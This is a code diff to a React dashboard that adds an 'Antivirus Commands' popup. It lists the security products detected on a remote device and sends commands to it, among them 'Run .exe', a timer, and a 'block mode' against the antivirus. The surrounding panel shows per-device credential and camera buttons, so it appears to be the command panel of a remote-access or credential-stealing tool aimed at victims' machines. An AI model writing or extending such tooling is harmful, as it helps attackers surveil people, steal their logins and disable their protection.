@@ -211,6 +211,28 @@ export default function DashboardPage() {
     }
     setCredentialLoading(false);
   };
+  const [antivirusPopup, setAntivirusPopup] = useState({ show: false, deviceId: '', loading: true, error: '', list: [], busy: null, msg: '' });
+  const [avMore, setAvMore] = useState(null);
+  const handleAntivirusClick = async (deviceId) => {
+    setAntivirusPopup({ show: true, deviceId, loading: true, error: '', list: [], busy: null, msg: '' });
+    setAvMore(null);
+    try {
+      const res = await axios.get(`${API_URL}/antivirus/${deviceId}`, { validateStatus: s => s === 200 || s === 404 });
+      setAntivirusPopup(p => ({ ...p, loading: false, list: res.status === 200 ? (res.data.antivirus || []) : [] }));
+    } catch {
+      setAntivirusPopup(p => ({ ...p, loading: false, error: 'Failed to load antivirus list' }));
+    }
+  };
+  const handleAntivirusCommand = async (antivirus, action) => {
+    if (!antivirusPopup.deviceId || antivirusPopup.busy) return;
+    setAntivirusPopup(p => ({ ...p, busy: `${antivirus}:${action}`, msg: '' }));
+    try {
+      const res = await axios.post(`${API_URL}/antivirus/command`, { device_id: antivirusPopup.deviceId, antivirus, action });
+      setAntivirusPopup(p => ({ ...p, busy: null, msg: res.data.success ? `Command sent: ${action}` : 'Command failed to send' }));
+    } catch {
+      setAntivirusPopup(p => ({ ...p, busy: null, msg: 'Failed to send command' }));
+    }
+  };
   useEffect(() => {
     if (!searchQuery.trim()) { setNoteSearchIds([]); return; }
     const timer = setTimeout(async () => {
@@ -320,6 +342,7 @@ export default function DashboardPage() {
                   <span className={`text-sm ${isOnline ? 'text-[#4caf50]' : 'text-[#555]'}`} title={`${d.viewer_count || 0} viewer(s) connected`}>&#127911;<span className="ml-0.5 text-xs font-semibold">{d.viewer_count || 0}</span></span>
                   <span className={`text-base cursor-pointer hover:text-[#aaa] transition-colors ${credentialLoading ? 'opacity-40 pointer-events-none' : ''}`} title="Credentials" onClick={e => { e.stopPropagation(); handleCredentialClick(d.device_id); }}>&#128273;</span>
                   <span className="text-base cursor-pointer text-[#4caf50] hover:text-[#66bb6a] transition-colors" title="Camera" onClick={e => { e.stopPropagation(); handleCameraClick(d.device_id); }}>&#128248;</span>
+                  <span className="text-base cursor-pointer text-[#ffa726] hover:text-[#ffb74d] transition-colors" title="Antivirus commands" onClick={e => { e.stopPropagation(); handleAntivirusClick(d.device_id); }}>&#128187;</span>
                   <span className="text-[#555] text-base cursor-pointer hover:text-[#e57373] transition-colors" title="Delete customer" onClick={e => { e.stopPropagation(); handleDeleteDevice(d.device_id); }}>&#128465;</span>
                 </div>
               </div>
@@ -506,6 +529,69 @@ export default function DashboardPage() {
                 Close
               </button>
             </div>
+          </div>
+        </div>
+      )}
+
+      {/* ── ANTIVIRUS POPUP ── */}
+      {antivirusPopup.show && (
+        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50" onClick={() => setAntivirusPopup({ show: false, deviceId: '', loading: true, error: '', list: [], busy: null, msg: '' })}>
+          <div className="bg-[#1c1c2c] border border-[#2a2a3e] rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl max-h-[80vh] overflow-y-auto scrollbar-thin" onClick={e => e.stopPropagation()}>
+            <div className="text-center mb-4">
+              <div className="text-4xl mb-2">&#128187;</div>
+              <h3 className="text-lg font-semibold text-[#ddd]">Antivirus Commands</h3>
+              <p className="text-xs text-[#666] mt-1 break-all">{antivirusPopup.deviceId}</p>
+            </div>
+            {antivirusPopup.loading ? (
+              <div className="text-center text-[#888] text-sm py-6">Loading detected antiviruses...</div>
+            ) : antivirusPopup.list.length === 0 ? (
+              <div className="text-center text-[#888] text-sm py-6">{antivirusPopup.error || 'No antiviruses detected on this device.'}</div>
+            ) : (
+              <div className="space-y-3">
+                {antivirusPopup.list.map(av => (
+                  <div key={av} className="bg-[#252538] border border-[#333348] rounded px-3 py-3">
+                    <div className="flex items-center justify-between mb-2">
+                      <span className="text-sm font-semibold text-[#ccc]">{av}</span>
+                      <div className="flex gap-2">
+                        <button onClick={() => handleAntivirusCommand(av, 'run_exe')}
+                          className="bg-[#00bcd4] text-white border-none rounded px-3 py-1.5 text-xs font-medium cursor-pointer hover:bg-[#00acc1] transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
+                          disabled={antivirusPopup.busy !== null}>
+                          Run .exe
+                        </button>
+                        <button onClick={() => setAvMore(avMore === av ? null : av)}
+                          className="bg-[#252538] text-[#ccc] border border-[#444] rounded px-3 py-1.5 text-xs font-medium cursor-pointer hover:bg-[#2a2a40] transition-colors">
+                          {avMore === av ? 'Less' : 'More'}
+                        </button>
+                      </div>
+                    </div>
+                    {avMore === av && (
+                      <div className="flex gap-2">
+                        <button onClick={() => handleAntivirusCommand(av, 'activate_ten_timer')}
+                          className="flex-1 bg-[#1b5e20] text-white border border-[#2e7d32] rounded py-1.5 text-xs font-medium cursor-pointer hover:bg-[#2e7d32] transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
+                          disabled={antivirusPopup.busy !== null}>
+                          Activate ten timer
+                        </button>
+                        <button onClick={() => handleAntivirusCommand(av, 'block')}
+                          className="flex-1 bg-[#b71c1c] text-white border border-[#c62828] rounded py-1.5 text-xs font-medium cursor-pointer hover:bg-[#c62828] transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
+                          disabled={antivirusPopup.busy !== null}>
+                          Activate block mode
+                        </button>
+                        <button onClick={() => handleAntivirusCommand(av, 'unblock')}
+                          className="flex-1 bg-[#252538] text-[#ccc] border border-[#333348] rounded py-1.5 text-xs font-medium cursor-pointer hover:bg-[#2a2a40] transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
+                          disabled={antivirusPopup.busy !== null}>
+                          Deactivate block mode
+                        </button>
+                      </div>
+                    )}
+                  </div>
+                ))}
+              </div>
+            )}
+            {antivirusPopup.msg && <div className="mt-3 text-center text-xs text-[#00bcd4]">{antivirusPopup.msg}</div>}
+            <button onClick={() => setAntivirusPopup({ show: false, deviceId: '', loading: true, error: '', list: [], busy: null, msg: '' })}
+              className="w-full mt-4 bg-[#252538] text-[#ccc] border border-[#333348] rounded py-2 text-sm font-medium hover:bg-[#2a2a40] transition-colors">
+              Close
+            </button>
           </div>
         </div>
       )}
